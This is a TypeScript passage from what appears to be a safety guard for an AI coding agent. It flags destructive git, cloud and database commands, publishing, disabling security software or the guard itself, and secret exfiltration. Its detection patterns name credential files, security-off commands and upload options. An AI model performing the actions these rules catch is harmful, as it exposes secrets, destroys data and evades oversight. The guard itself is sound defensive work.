  const known =
    /^(push|branch|checkout|switch|reset|clean|filter-branch|filter-repo|config|commit|rm|stash|restore|worktree|update-ref|reflog|gc|replace|add|rebase|merge|status|log|diff|show|fetch|pull|clone|init|tag|remote|mv|grep|blame|cherry-pick|revert|am|apply|bisect|describe|shortlog|notes|submodule|ls-files|ls-tree|cat-file|rev-parse|rev-list|for-each-ref|symbolic-ref|archive|bundle|fsck|prune|maintenance|sparse-checkout|help|version|var|count-objects|hash-object|write-tree|read-tree|commit-tree|mktag|mktree|verify-commit|verify-tag|whatchanged|range-diff|format-patch|send-email|request-pull|instaweb|gui|citool|difftool|mergetool|credential|lfs|annex|flow|absorb|switch)$/;
  if (call.sub && !known.test(call.sub) && ctx.git && call.dir) {
    const expansion = await ctx.git.alias(call.dir, call.sub);
    if (expansion) {
      if (expansion.startsWith('!')) {
        await evaluateScript(expansion.slice(1) + ' ' + call.args.join(' '), 'bash', s, cwd);
        return;
      }
      const parts = expansion.split(/\s+/).filter(Boolean);
      call = {
        ...call,
        sub: (parts[0] ?? '').toLowerCase(),
        args: [...parts.slice(1), ...call.args],
        dynamic: [...parts.slice(1).map(() => false), ...call.dynamic],
      };
    }
  }
  const dir = call.dir === null ? null : paths.canonical(call.dir);
  const inMemory = dir !== null && under(dir, paths.memoryDirs, ctx.platform) !== null;
  // A hooks path inside the project, named by the person (a husky setup), stands on that evidence.
  const hooksUnit = (value: string | undefined): Unit | undefined => {
    if (!value || dir === null) return undefined;
    const project = paths.canonical(resolvePath(ctx.projectDir, { platform: ctx.platform, home: ctx.home, cwd: ctx.cwd }));
    const at = paths.canonical(resolvePath(value, { platform: ctx.platform, home: ctx.home, cwd: dir }));
    return isUnder(at, project, ctx.platform) || pathKey(at, ctx.platform) === pathKey(project, ctx.platform) ? { kind: 'path', values: [value] } : undefined;
  };
  for (const kv of call.config)
    if (/^core\.hookspath=/i.test(kv)) {
      add(s, 'git.hooks-path', 'belt.reason.hooksPath', { command: show(inv.raw) });
      actsOn(s, hooksUnit(kv.slice(kv.indexOf('=') + 1)));
    }
  const a = call.args;
  const has = (...flags: string[]) => a.some((x) => flags.includes(x));
  const protectedBranches = cfg.protectedBranches?.length ? cfg.protectedBranches : ['main', 'master'];
  // What a safety net keeps before a call that rewrites what the repository holds: every tip, and what is not committed.
  const refsNet: NetPlan | undefined = dir === null ? undefined : { kind: 'refs', repo: dir };

  switch (call.sub) {
    case 'push': {
      const current = dir && ctx.git ? await ctx.git.currentBranch(dir) : null;
      const plan = planPush(a, current);
      if (plan.dryRun) break;
      if (plan.noVerify) add(s, 'git.no-verify', 'belt.reason.noVerify', { command: show(inv.raw) });
      const remoteUrl = plan.remote && looksLikeUrl(plan.remote) ? plan.remote : dir && ctx.git ? await ctx.git.remoteUrl(dir, plan.remote ?? undefined) : null;
      const prOnly = remoteMatches(remoteUrl, cfg.prOnlyRepos);
      if (inMemory && (plan.force || plan.mirror || plan.targets.some((t) => t.delete)))
        add(s, 'self.memory-history', 'belt.reason.memoryHistory', { command: show(inv.raw) });
      if (plan.mirror || plan.prune) add(s, 'git.mirror-or-prune', 'belt.reason.mirrorPrune', { command: show(inv.raw) });
      // The remote's tip, as its remote-tracking branch has it: a remote given as an address has none.
      const remoteName = plan.remote === null ? 'origin' : looksLikeUrl(plan.remote) ? null : plan.remote;
      const remoteNet = (branch: string): NetPlan | undefined =>
        dir === null || remoteName === null ? undefined : { kind: 'remote', repo: dir, remote: remoteName, branch };
      for (const t of plan.targets) {
        const branchLabel = t.dst ?? tIn(ctx.lang, 'belt.word.currentBranchUnknown');
        const prot = t.dst === null ? false : isProtectedBranch(t.dst, protectedBranches);
        if (t.delete) {
          if (prot || t.dst === null) add(s, 'git.delete-remote-branch-protected', 'belt.reason.deleteRemoteProtected', { branch: branchLabel });
          else add(s, 'git.delete-remote-branch', 'belt.reason.deleteRemote', { branch: branchLabel }, remoteNet(t.dst));
          continue;
        }
        if (t.force) {
          if (prot || t.dst === null) add(s, 'git.force-push-protected', 'belt.reason.forcePushProtected', { branch: branchLabel });
          else add(s, 'git.force-push', 'belt.reason.forcePush', { branch: branchLabel }, remoteNet(t.dst));
        }
        if (prOnly && (prot || t.dst === null)) add(s, 'git.push-pr-only', 'belt.reason.prOnly', { branch: branchLabel, remote: remoteUrl ?? '?' });
      }
      break;
    }
    case 'branch': {
      const forceDelete = has('-D') || (has('-d', '--delete') && has('-f', '--force')) || a.some((x) => /^-[a-zA-Z]*D/.test(x));
      if (forceDelete) {
        add(
          s,
          inMemory ? 'self.memory-history' : 'git.branch-force-delete',
          inMemory ? 'belt.reason.memoryHistory' : 'belt.reason.branchForceDelete',
          { command: show(inv.raw) },
          refsNet,
        );
        // Branches already merged into the current one lose no commit: cleaning them up is a note, not a question.
        const names = a.filter((x) => !x.startsWith('-'));
        if (!inMemory && dir !== null && names.length && ctx.git?.merged) {
          const merged = await Promise.all(names.map((n) => ctx.git!.merged!(dir, n)));
          const f = s.findings.at(-1);
          if (f && merged.every((m) => m === true)) f.atMost = 'note';
        }
        break;
      }
      const creating = a.length > 0 && !a[0]!.startsWith('-');
      if (creating && dir && ctx.git && remoteMatches(await ctx.git.remoteUrl(dir), cfg.singleBranchRepos))
        add(s, 'git.single-branch', 'belt.reason.singleBranch', { branch: a[0]! });
      break;
    }
    case 'checkout':
    case 'switch': {
      const ci = a.findIndex((x) => x === '-b' || x === '-B' || x === '--orphan' || x === '-c' || x === '-C');
      if (ci !== -1 && a[ci + 1] && dir && ctx.git && remoteMatches(await ctx.git.remoteUrl(dir), cfg.singleBranchRepos))
        add(s, 'git.single-branch', 'belt.reason.singleBranch', { branch: a[ci + 1]! });
      if (inMemory && has('--orphan')) add(s, 'self.memory-history', 'belt.reason.memoryHistory', { command: show(inv.raw) });
      if (call.sub === 'checkout' && (has('--') || has('.')) && !has('-b', '-B'))
        add(s, 'git.discard-work', 'belt.reason.discardWork', { command: show(inv.raw) }, refsNet);
      break;
    }
    case 'worktree':
      if (a[0] === 'add' && a.includes('-b') && dir && ctx.git && remoteMatches(await ctx.git.remoteUrl(dir), cfg.singleBranchRepos))
        add(s, 'git.single-branch', 'belt.reason.singleBranch', { branch: a[a.indexOf('-b') + 1] ?? '?' });
      break;
    case 'reset':
      if (has('--hard', '--merge', '--keep'))
        add(
          s,
          inMemory ? 'self.memory-history' : 'git.discard-work',
          inMemory ? 'belt.reason.memoryHistory' : 'belt.reason.discardWork',
          { command: show(inv.raw) },
          refsNet,
        );
      break;
    case 'restore':
      if (!has('--staged', '-S') || has('--worktree', '-W')) add(s, 'git.discard-work', 'belt.reason.discardWork', { command: show(inv.raw) }, refsNet);
      break;
    case 'stash':
      if (a[0] === 'drop' || a[0] === 'clear') add(s, 'git.discard-work', 'belt.reason.discardWork', { command: show(inv.raw) }, refsNet);
      break;
    case 'clean': {
      const dry = a.some((x) => x === '-n' || x === '--dry-run' || /^-[a-zA-Z]*n/.test(x));
      const forced = a.some((x) => x === '--force' || /^-[a-zA-Z]*f/.test(x));
      // What clean would remove, asked of git itself with the same flags (src/core/net.ts).
      const cleanNet: NetPlan | undefined = dir === null || call.dynamic.some(Boolean) ? undefined : { kind: 'untracked', repo: dir, args: a };
      if (forced && !dry)
        add(
          s,
          inMemory ? 'self.memory-history' : 'git.clean',
          inMemory ? 'belt.reason.memoryHistory' : 'belt.reason.clean',
          { command: show(inv.raw) },
          cleanNet,
        );
      break;
    }
    case 'filter-branch':
    case 'filter-repo':
    case 'replace':
      add(
        s,
        inMemory ? 'self.memory-history' : 'git.history-rewrite',
        inMemory ? 'belt.reason.memoryHistory' : 'belt.reason.historyRewrite',
        { command: show(inv.raw) },
        refsNet,
      );
      break;
    case 'update-ref':
      if (has('-d', '--delete'))
        add(
          s,
          inMemory ? 'self.memory-history' : 'git.history-rewrite',
          inMemory ? 'belt.reason.memoryHistory' : 'belt.reason.historyRewrite',
          { command: show(inv.raw) },
          refsNet,
        );
      break;
    case 'reflog':
      if (inMemory && (a[0] === 'expire' || a[0] === 'delete')) add(s, 'self.memory-history', 'belt.reason.memoryHistory', { command: show(inv.raw) });
      break;
    case 'gc':
    case 'prune':
      if (inMemory && a.some((x) => x.startsWith('--prune'))) add(s, 'self.memory-history', 'belt.reason.memoryHistory', { command: show(inv.raw) });
      break;
    case 'rebase':
      if (inMemory) add(s, 'self.memory-history', 'belt.reason.memoryHistory', { command: show(inv.raw) });
      break;
    case 'config': {
      const i = a.findIndex((x) => /^core\.hookspath$/i.test(x));
      // The key alone reads it (`git config core.hooksPath`, `git config get …`); a value or an unset changes it.
      const reads =
        has('--get', '--get-all', '-l', '--list', '--show-origin') ||
        a[0] === 'get' ||
        (a[i + 1] === undefined && a[0] !== 'unset' && !has('--unset', '--unset-all'));
      if (i !== -1 && !reads) {
        add(s, 'git.hooks-path', 'belt.reason.hooksPath', { command: show(inv.raw) });
        actsOn(s, hooksUnit(a[i + 1]));
      }
      break;
    }
    case 'commit':
      if (has('--no-verify') || a.some((x) => /^-[a-zA-Z]*n[a-zA-Z]*$/.test(x) && !x.startsWith('--')))
        add(s, 'git.no-verify', 'belt.reason.noVerify', { command: show(inv.raw) });
      break;
    case 'rm':
      if (
        inMemory ||
        (dir && a.some((x) => !x.startsWith('-') && under(paths.canonical(resolvePath(x, { ...env, cwd: dir })), paths.memoryDirs, ctx.platform)))
      )
        add(s, 'self.memory-delete', 'belt.reason.gitRmMemory', { command: show(inv.raw) });
      break;
    case 'add':
      for (const x of a)
        if (!x.startsWith('-') && SECRET_FILE.test(x.split(/[\\/]/).pop() ?? '')) add(s, 'secrets.stage', 'belt.reason.stageSecret', { file: x });
      break;
  }
}

const SECRET_FILE =
  /^(?:\.env(?:\..+)?|\.dev\.vars|.*\.(?:pem|key|p12|pfx|jks|keystore|ppk|asc)|id_(?:rsa|dsa|ecdsa|ed25519)(?:\.pub)?|\.?credentials(?:\.json)?|service-account.*\.json|key\.properties|\.npmrc|\.pypirc|\.netrc|\.git-credentials|secrets?\.(?:json|ya?ml|toml))$/i;

/**
 * A file whose content is a secret: what SECRET_FILE names, less what only looks like one (a template of
 * .env, a public key, an ASCII-armoured key or signature that is usually public). Sending one of these out
 * is blocked without a way around, so the list stays to what is surely secret.
 */
function secretFile(path: string): boolean {
  const name =
    path
      .replace(/[;,].*$/, '')
      .split(/[\\/]/)
      .pop() ?? '';
  return SECRET_FILE.test(name) && !/\.(?:example|sample|template|dist|pub|asc)$/i.test(name);
}

/** The high-confidence secrets in a text sent out (their kinds), for secrets.exfil. */
function secretKinds(text: string): string[] {
  return [
    ...new Set(
      scanSecrets(text)
        .filter((m) => m.confidence === 'high')
        .map((m) => m.kind),
    ),
  ];
}

function checkClaude(ws: Word[], s: Scope): void {
  const a = ws.map((w) => w.text);
  const lower = a.map((x) => x.toLowerCase());
  const sub = lower[0] ?? '';
  const mentionsUs = lower.some((x) => x === PLUGIN_NAME || x.startsWith(`${PLUGIN_NAME}@`) || x === MARKETPLACE_NAME);
  if (sub === 'plugin' || sub === 'plugins') {
    const verb = lower[1] ?? '';
    if (['disable', 'uninstall', 'remove', 'rm'].includes(verb) && mentionsUs)
      return add(s, 'self.plugin-cli', 'belt.reason.pluginSelf', { command: a.join(' ') });
    if (verb === 'marketplace' && ['remove', 'rm'].includes(lower[2] ?? '') && mentionsUs)
      return add(s, 'self.plugin-cli', 'belt.reason.pluginSelf', { command: a.join(' ') });
    if (
      ['install', 'i', 'enable', 'disable', 'uninstall', 'remove', 'rm', 'update', 'marketplace'].includes(verb) &&
      !(verb === 'marketplace' && (lower[2] === 'list' || lower[2] === undefined))
    )
      add(s, 'claude.config-change', 'belt.reason.claudeConfigChange', { command: a.join(' ') });
    return;
  }
  if (sub === 'mcp' && ['add', 'add-json', 'remove', 'add-from-claude-desktop', 'reset-project-choices'].includes(lower[1] ?? ''))
    return add(s, 'claude.config-change', 'belt.reason.claudeConfigChange', { command: a.join(' ') });
  if (sub === 'config' && ['set', 'add', 'remove', 'unset'].includes(lower[1] ?? ''))
    return add(s, 'claude.config-change', 'belt.reason.claudeConfigChange', { command: a.join(' ') });
  if (sub === 'update' || sub === 'install' || sub === 'migrate-installer')
    return add(s, 'claude.config-change', 'belt.reason.claudeConfigChange', { command: a.join(' ') });
  // A nested session that would run without hooks or without the person's settings.
  const i = lower.findIndex((x) => x === '--setting-sources' || x.startsWith('--setting-sources='));
  const sources = i === -1 ? null : lower[i]!.includes('=') ? lower[i]!.split('=')[1]! : (lower[i + 1] ?? '');
  const settingsIdx = lower.findIndex((x) => x === '--settings' || x.startsWith('--settings='));
  const settingsVal =
    settingsIdx === -1 ? '' : a[settingsIdx]!.includes('=') ? a[settingsIdx]!.slice(a[settingsIdx]!.indexOf('=') + 1) : (a[settingsIdx + 1] ?? '');
  if (
    lower.includes('--bare') ||
    lower.includes('--safe-mode') ||
    (sources !== null && !sources.split(',').includes('user')) ||
    /disableAllHooks|allowManagedHooksOnly/i.test(settingsVal)
  ) {
    add(s, 'self.nested-session', 'belt.reason.nestedSession', { command: a.join(' ') });
  }
}

function checkDocker(p: string, ws: Word[], raw: string, s: Scope): void {
  const a = ws.map((w) => w.text.toLowerCase());
  const volumeFlag = a.some((x) => x === '--volumes' || /^-[a-z]*v[a-z]*$/.test(x));
  const sub = a[0] ?? '';
  const hit =
    (sub === 'volume' && ['rm', 'remove', 'prune'].includes(a[1] ?? '')) ||
    ((sub === 'system' || sub === 'container') && a[1] === 'prune') ||
    ((sub === 'compose' || p === 'docker-compose' || sub === 'stack') && a.includes('down') && volumeFlag) ||
    (sub === 'rm' && volumeFlag);
  if (hit) add(s, 'docker.volume-delete', 'belt.reason.dockerVolume', { command: show(raw) });
  if (sub === 'push') add(s, 'publish.package', 'belt.reason.publish', { command: show(raw) });
}

function checkPublish(p: string, ws: Word[], raw: string, s: Scope): void {
  const a = ws.map((w) => w.text.toLowerCase());
  const first = a[0] ?? '';
  const pub = () => add(s, 'publish.package', 'belt.reason.publish', { command: show(raw) });
  const dep = () => add(s, 'publish.deploy', 'belt.reason.deploy', { command: show(raw) });
  // A dry run publishes and deploys nothing (wrangler, npm, cargo, helm, kubectl --dry-run=client|server).
  if (a.some((x) => x === '--dry-run' || x === '--dryrun' || x.startsWith('--dry-run='))) return;
  if (['npm', 'pnpm', 'bun'].includes(p) && ['publish', 'unpublish', 'deprecate', 'owner', 'access'].includes(first)) return pub();
  if (p === 'npm' && first === 'dist-tag' && ['add', 'rm'].includes(a[1] ?? '')) return pub();
  if (p === 'yarn' && (first === 'publish' || (first === 'npm' && a[1] === 'publish'))) return pub();
  if (
    (p === 'cargo' && first === 'publish') ||
    (p === 'gem' && first === 'push') ||
    (p === 'twine' && first === 'upload') ||
    (p === 'poetry' && first === 'publish')
  )
    return pub();
  if ((p === 'flutter' || p === 'dart') && first === 'pub' && a[1] === 'publish') return pub();
  if ((p === 'vsce' || p === 'ovsx') && first === 'publish') return pub();
  if ((p === 'dotnet' && first === 'nuget' && a[1] === 'push') || (p === 'nuget' && first === 'push') || (p === 'mvn' && a.includes('deploy'))) return pub();
  if ((p === 'gradle' || p === 'gradlew') && a.some((x) => /^:?(?:[\w-]+:)*publish/.test(x))) return pub();
  if (p === 'gh') {
    if (first === 'release' && ['create', 'upload'].includes(a[1] ?? '')) return pub();
    if (first === 'repo' && a[1] === 'create' && a.includes('--public'))
      return void add(s, 'publish.visibility', 'belt.reason.visibility', { command: show(raw) });
    if (first === 'repo' && a[1] === 'edit' && (a.includes('--visibility=public') || a[a.indexOf('--visibility') + 1] === 'public'))
      return void add(s, 'publish.visibility', 'belt.reason.visibility', { command: show(raw) });
    if (first === 'gist' && a[1] === 'create' && (a.includes('--public') || a.includes('-p')))
      return void add(s, 'publish.visibility', 'belt.reason.visibility', { command: show(raw) });
    if (first === 'api' && a.some((x) => /^private=false$|visibility=public/.test(x)))
      return void add(s, 'publish.visibility', 'belt.reason.visibility', { command: show(raw) });
    return;
  }
  if (p === 'firebase' && first === 'deploy') return dep();
  if (p === 'wrangler' && ['deploy', 'publish', 'secret', 'kv', 'r2', 'd1', 'queues', 'versions'].includes(first) && !['list', 'get'].includes(a[1] ?? ''))
    return dep();
  if (p === 'vercel' && (a.includes('--prod') || (first === 'deploy' && a.includes('--prod')))) return dep();
  if (p === 'netlify' && first === 'deploy' && a.includes('--prod')) return dep();
  if ((p === 'fly' || p === 'flyctl') && first === 'deploy') return dep();
  if (p === 'kubectl' && ['apply', 'delete', 'replace', 'patch', 'rollout', 'scale', 'drain'].includes(first)) return dep();
  if (p === 'helm' && ['install', 'upgrade', 'uninstall', 'rollback', 'delete'].includes(first)) return dep();
  if ((p === 'terraform' || p === 'tofu') && ['apply', 'destroy', 'import'].includes(first)) return dep();
  if (p === 'pulumi' && ['up', 'destroy', 'update'].includes(first)) return dep();
  if ((p === 'serverless' || p === 'sls' || p === 'cdk') && ['deploy', 'destroy', 'remove'].includes(first)) return dep();
  // App stores: an upload, a submission, a release, a review cancelled (asc, gplay, fastlane, eas, altool).
  const store = () => add(s, 'publish.store', 'belt.reason.store', { command: show(raw) });
  if (p === 'eas' && (first === 'submit' || a.includes('--auto-submit'))) return store();
  if (p === 'fastlane' || (p === 'xcrun' && first === 'altool' && a.some((x) => x.includes('upload')))) return store();
  if (
    p === 'asc' &&
    (first === 'publish' ||
      (first === 'submit' && a[1] !== 'status') ||
      (first === 'builds' && ['upload', 'add-groups'].includes(a[1] ?? '')) ||
      (first === 'release' && a[1] === 'stage') ||
      a.includes('--submit'))
  )
    return store();
  if (p === 'gplay' && first === 'releases' && !['list', 'get', 'status', 'show'].includes(a[1] ?? '')) return store();
  if (p === 'stripe' && PAY_RESOURCE.test(first) && /^(?:create|update|confirm|capture|cancel|pay|finalize|void|send)$/.test(a[1] ?? ''))
    return void add(s, 'outbound.payment', 'belt.reason.payment', { what: show(raw) });
  if (p === 'gcloud' && a.includes('deploy')) return dep();
}

// ── data, security software, secrets leaving, GitHub, connected services ─────────────────────────────

/** Words of a call, lower case, without options: `gcloud sql instances delete x --quiet` → gcloud's words. */
function plainWords(inv: Invocation): string[] {
  return inv.args.filter((x) => !x.startsWith('-')).map((x) => x.toLowerCase());
}

/** The value of an option: `-c x`, `-cx`, `--command x`, `--command=x`; every occurrence. */
function optionValues(args: readonly string[], shorts: readonly string[], longs: readonly string[]): string[] {
  const out: string[] = [];
  for (let i = 0; i < args.length; i++) {
    const a = args[i]!;
    // A next word that is itself an option is not this one's value (`psql -e -c …`: -e takes none).
    const next = args[i + 1];
    const value = next !== undefined && !(next.startsWith('-') && next.length > 1);
    const long = longs.find((l) => a === l || a.startsWith(`${l}=`));
    if (long) {
      if (a.length > long.length) out.push(a.slice(long.length + 1));
      else if (value) out.push(args[++i]!);
      continue;
    }
    const short = shorts.find((x) => a === x || (a.startsWith(x) && !a.startsWith('--') && x.length === 2));
    if (short) {
      if (a.length > short.length) out.push(a.slice(short.length));
      else if (value) out.push(args[++i]!);
    }
  }
  return out;
}

const DROP_SQL = /\b(?:drop\s+(?:database|schema|table)|truncate(?:\s+table)?\s+\w)/i;
const DROP_MONGO = /\bdropDatabase\s*\(|\.drop\s*\(\s*\)|\.deleteMany\s*\(\s*\{\s*\}\s*\)/;
/** gcloud and az groups that hold data: deleting in them deletes data in the cloud. */
const CLOUD_DATA_GROUPS = new Set([
  'sql',
  'firestore',
  'storage',
  'spanner',
  'bigtable',
  'redis',
  'filestore',
  'alloydb',
  'projects',
  'buckets',
  'databases',
  'cosmosdb',
  'group',
  'postgres',
  'mysql',
  'keyvault',
]);
/** aws services that hold data, whose delete-* calls delete it. */
const AWS_DATA = new Set(['s3api', 'rds', 'dynamodb', 'docdb', 'neptune', 'redshift', 'elasticache', 'efs', 'glacier', 'keyspaces', 'opensearch', 'es']);

/**
 * Data that lives elsewhere: in the cloud (Firebase, buckets, managed databases, a GitHub repository) it is
 * blocked to delete and asked to overwrite; a database reset whose target the command does not show (a
 * local development database as often as a live one) is asked about.
 */
function checkData(inv: Invocation, s: Scope): void {
  const p = inv.program;
  const a = inv.args.map((x) => x.toLowerCase());
  const w = plainWords(inv);
  const raw = show(inv.raw);
  const cloud = () => add(s, 'data.delete-cloud', 'belt.reason.deleteCloud', { command: raw });
  const reset = () => add(s, 'data.reset-database', 'belt.reason.resetDatabase', { command: raw });
  switch (p) {
    case 'firebase': {
      const sub = w[0] ?? '';
      const emulated = !!(s.ctx.env.FIREBASE_DATABASE_EMULATOR_HOST || s.ctx.env.FIRESTORE_EMULATOR_HOST);
      if (emulated) return;
      if (sub === 'firestore:delete' || sub === 'database:remove' || sub === 'firestore:databases:delete') return cloud();
      if (/^database:(?:set|update|push)$/.test(sub)) return void add(s, 'data.write-cloud', 'belt.reason.writeCloud', { command: raw });
      return;
    }
    case 'gsutil':
      if ((w.includes('rm') && a.some((x) => /^-[a-z]*[rR][a-z]*$/i.test(x) || x === '--recursive')) || w.includes('rb')) cloud();
      return;
    case 'gcloud':
    case 'az': {
      const del = w.findLast((x) => /^delete(?:-batch)?$/.test(x));
      // One blob or object is a file, not a store: `az storage blob delete` stays a file deletion.
      const single = w[0] === 'storage' && (w[1] === 'blob' || w[1] === 'objects') && del === 'delete';
      if (del && !single && w.slice(0, w.lastIndexOf(del)).some((x) => CLOUD_DATA_GROUPS.has(x))) return cloud();
      if (p === 'gcloud' && w[0] === 'storage' && w[1] === 'rm' && a.some((x) => x === '-r' || x === '--recursive')) cloud();
      return;
    }
    case 'aws': {
      if (w[0] === 's3' && ((w[1] === 'rm' && a.includes('--recursive')) || w[1] === 'rb' || (w[1] === 'sync' && a.includes('--delete')))) return cloud();
      if (AWS_DATA.has(w[0] ?? '') && /^delete-/.test(w[1] ?? '')) cloud();
      return;
    }
    case 'wrangler':
      if (
        (w[0] === 'kv' && w[1] === 'namespace' && w[2] === 'delete') ||
        (w[0] === 'kv:namespace' && w[1] === 'delete') ||
        (w[0] === 'r2' && w[1] === 'bucket' && w[2] === 'delete') ||
        (w[0] === 'd1' && w[1] === 'delete')
      )
        cloud();
      return;
    case 'supabase':
      if (w[0] === 'projects' && w[1] === 'delete') return cloud();
      if (w[0] === 'db' && w[1] === 'reset') return a.some((x) => x === '--linked' || x.startsWith('--db-url')) ? cloud() : reset();
      return;
    case 'prisma':
      if ((w[0] === 'migrate' && w[1] === 'reset') || (w[0] === 'db' && w[1] === 'push' && a.some((x) => x === '--force-reset' || x === '--accept-data-loss')))
        reset();
      return;
    case 'redis-cli':
      if (a.some((x) => x === 'flushall' || x === 'flushdb')) reset();
      return;
    case 'dropdb':
      return reset();
    case 'mysqladmin':
      if (w.includes('drop')) reset();
      return;
    case 'psql':
    case 'mysql':
    case 'mariadb':
    case 'sqlcmd':
      if (optionValues(inv.args, ['-c', '-e', '-Q', '-q'], ['--command', '--execute']).some((x) => DROP_SQL.test(x))) reset();
      return;
    case 'mongosh':
    case 'mongo':
      if (optionValues(inv.args, [], ['--eval']).some((x) => DROP_MONGO.test(x) || DROP_SQL.test(x))) reset();
      return;
    case 'rails':
    case 'rake':
      if (w.some((x) => /^db:(?:drop|reset|truncate_all|schema:load)(?::|$)/.test(x))) reset();
      return;
    case 'php':
      if (w[0] === 'artisan' && /^(?:migrate:fresh|migrate:reset|db:wipe)$/.test(w[1] ?? '')) reset();
      return;
    case 'python':
    case 'python3':
    case 'py':
      if (/(?:^|[\\/])manage\.py$/.test(w[0] ?? '') && w[1] === 'flush') reset();
      return;
    case 'django-admin':
      if (w[0] === 'flush') reset();
      return;
  }
}

/** Windows services of the security software: Defender, its firewall, the security center. */
const SECURITY_SERVICE = /^(?:windefend|wdnissvc|wdfilter|wdboot|sense|mpssvc|wscsvc|securityhealthservice|mdcoresvc)$/i;
/** Registry places of Defender, the security center and the account control prompt. */
const SECURITY_KEY = /windows defender|\\?windefend\b|securityhealth|\benablelua\b|\bconsentpromptbehavioradmin\b|\\?wscsvc\b/i;
/** Linux and macOS services that guard the machine. */
const SECURITY_UNIT = /^(?:firewalld|ufw|nftables|iptables|apparmor|auditd|clamav-daemon|clamav-freshclam|clamd)(?:\.service)?$/i;

/** Turning security software off: blocked. */
function checkSecurityOff(inv: Invocation, dialect: Dialect, s: Scope): void {
  const p = inv.program;
  const a = inv.args;
  const lower = a.map((x) => x.toLowerCase());
  const off = () => add(s, 'system.security-off', 'belt.reason.securityOff', { command: show(inv.raw) });
  const falsy = (v: string | undefined) => v !== undefined && /^(?:\$?false|0)$/i.test(v);
  switch (p) {
    case 'set-mppreference':
    case 'add-mppreference':
      for (let i = 0; i < a.length; i++) {
        const [name, inline] = splitParam(a[i]!);
        if (!a[i]!.startsWith('-')) continue;
        if (/^exclusion/.test(name)) return off();
        if (p === 'set-mppreference' && /^disable/.test(name) && !falsy(inline ?? (a[i + 1]?.startsWith('-') ? undefined : a[i + 1]))) return off();
      }
      return;
    case 'uninstall-windowsfeature':
    case 'remove-windowsfeature':
    case 'disable-windowsoptionalfeature':
      if (lower.some((x) => x.includes('defender'))) off();
      return;
    case 'set-netfirewallprofile':
      for (let i = 0; i < a.length; i++) {
        const [name, inline] = splitParam(a[i]!);
        if (a[i]!.startsWith('-') && 'enabled'.startsWith(name) && name.length >= 2 && falsy(inline ?? a[i + 1])) return off();
      }
      return;
    case 'netsh': {
      const line = lower.join(' ');
      if (/\badvfirewall\s+set\s+\S+\s+state\s+off\b/.test(line) || /\bfirewall\s+set\s+opmode\s+(?:mode=)?disable/.test(line)) off();
      return;
    }
    case 'sc':
      if (dialect !== 'powershell' && /^(?:stop|delete|config)$/.test(lower[0] ?? '') && SECURITY_SERVICE.test(lower[1] ?? '')) {
        if (lower[0] !== 'config' || lower.some((x) => x.includes('disabled'))) off();
      }
      return;
    case 'net':
      if (lower[0] === 'stop' && SECURITY_SERVICE.test(lower[1] ?? '')) off();
      return;
    case 'stop-service':
    case 'set-service':
      if (lower.some((x) => SECURITY_SERVICE.test(x)) && (p === 'stop-service' || lower.some((x) => x === 'disabled' || x === 'stopped'))) off();
      return;
    case 'reg':
      if (/^(?:add|delete|import)$/.test(lower[0] ?? '') && a.some((x) => SECURITY_KEY.test(x))) off();
      return;
    case 'set-itemproperty':
    case 'new-itemproperty':
    case 'remove-itemproperty':
      if (a.some((x) => SECURITY_KEY.test(x))) off();
      return;
    case 'spctl':
      if (lower.includes('--master-disable') || lower.includes('--global-disable')) off();
      return;
    case 'socketfilterfw':
      if (lower.join(' ').includes('--setglobalstate off')) off();
      return;
    case 'csrutil':
      if (lower[0] === 'disable') off();
      return;
    case 'ufw':
      if (lower[0] === 'disable') off();
      return;
    case 'systemctl':
      if (/^(?:stop|disable|mask|kill)$/.test(lower.find((x) => !x.startsWith('-')) ?? '') && lower.some((x) => SECURITY_UNIT.test(x))) off();
      return;
    case 'setenforce':
      if (/^(?:0|permissive)$/.test(lower[0] ?? '')) off();
      return;
    case 'iptables':
    case 'ip6tables':
      if (lower.some((x) => x === '-f' || x === '--flush')) off();
      return;
    case 'nft':
      if (lower[0] === 'flush' && lower[1] === 'ruleset') off();
      return;
  }
}

/** A remote destination of scp, rsync and the like: host:path, user@host:path, a URL; not a drive letter. */
function remoteTarget(x: string): boolean {
  if (/^[A-Za-z]:[\\/]/.test(x)) return false;
  return /^(?:[\w.-]+@)?[\w.-]+:/.test(x) || /^(?:rsync|sftp|scp|ftp|https?):\/\//i.test(x);
}

/**
 * A secret leaving the machine: a key or credential file uploaded, or a secret written into what is sent
 * (a request body, a form, a gist). Blocked always: the person sends it themselves if it
 * must go. Authentication to the service itself (a header, a client certificate, an ssh key) is not sending.
 */
function checkExfil(inv: Invocation, ws: Word[], s: Scope): void {
  const p = inv.program;
  const a = inv.args;
  const leak = (what: string) => add(s, 'secrets.exfil', 'belt.reason.exfil', { what: show(what) });
  const files: string[] = [];
  const bodies: string[] = [];
  switch (p) {
    case 'curl':
      for (const v of optionValues(a, ['-d'], ['--data', '--data-binary', '--data-urlencode', '--json'])) {
        const at = /^(?:[^=@]*=)?@(.+)$/.exec(v);
        if (at) files.push(at[1]!);
        else bodies.push(v);
      }
      bodies.push(...optionValues(a, [], ['--data-raw']));
      for (const v of optionValues(a, ['-F'], ['--form', '--form-string'])) {
        const f = /=[@<]([^;]+)/.exec(v);
        if (f) files.push(f[1]!);
        else bodies.push(v);
      }
      files.push(...optionValues(a, ['-T'], ['--upload-file']));
      break;
    case 'wget':
      files.push(...optionValues(a, [], ['--post-file', '--body-file']));
      bodies.push(...optionValues(a, [], ['--post-data', '--body-data']));
      break;
    case 'invoke-webrequest':
    case 'invoke-restmethod': {
      const named = psNamed(ws, { infile: 'InFile', body: 'Body' }, []);
      if (named.infile) files.push(named.infile.text);
      if (named.body) bodies.push(named.body.text);
      break;
    }
    case 'scp':
    case 'pscp':
    case 'rsync': {
      const withValue = new Set(['-i', '-P', '-o', '-F', '-c', '-l', '-S', '-J', '-e', '--rsh', '--exclude', '--include', '--filter', '-pw']);
      const pos = positional(ws, withValue).map((w) => w.text);
      if (pos.length >= 2 && remoteTarget(pos[pos.length - 1]!)) files.push(...pos.slice(0, -1).filter((x) => !remoteTarget(x)));
      break;
    }
    case 'gh': {
      const w = plainWords(inv);
      if (w[0] === 'gist' && w[1] === 'create')
        files.push(
          ...positional(ws, new Set(['-d', '--desc', '-f', '--filename']))
            .slice(2)
            .map((x) => x.text),
        );
      if (w[0] === 'release' && w[1] === 'upload')
        files.push(
          ...positional(ws)
            .slice(3)
            .map((x) => x.text.replace(/#.*$/, '')),
        );
      break;
    }
    default:
      return;
  }
  for (const f of files) if (secretFile(f)) return leak(f);
  for (const b of bodies) {
    const kinds = secretKinds(b);
    if (kinds.length) return leak(kinds.join(', '));
  }
}

/** Programs that print or pack a file's content: what they read can be piped onwards. */
